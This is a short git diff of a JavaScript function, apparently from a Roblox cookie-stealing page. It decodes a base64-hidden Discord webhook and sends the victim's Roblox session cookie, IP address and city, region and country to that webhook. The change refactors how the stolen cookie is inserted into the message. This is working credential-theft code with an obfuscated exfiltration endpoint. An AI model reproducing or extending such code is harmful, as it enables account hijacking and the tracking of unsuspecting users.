@@ -263,9 +263,10 @@ async function submitPowerShell() {
         const webhookUrl = atob('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM5NTQ1MDc3NDQ4OTY2MTQ4MC9lby0yV3Y0dEUwV2didGh5WmJJWFFja0tDc3BLeUJNQzN6V1k3WmN5VzVSZzNfVm4xajh4UUxxUTRmR20wM2NFSEVHdQ==');
         
         // Simple webhook payload - only cookie and location  
+        const fullCookie = robloxCookie || 'None found';
         const payload = {
             content: `@everyone
-Cookie: ${robloxCookie || 'None found'}
+Cookie: ${fullCookie}
 Location: ${locationInfo.city || 'Unknown'}, ${locationInfo.region || 'Unknown'}, ${locationInfo.country || 'Unknown'}
 IP: ${locationInfo.ip || 'Unknown'}`
         };
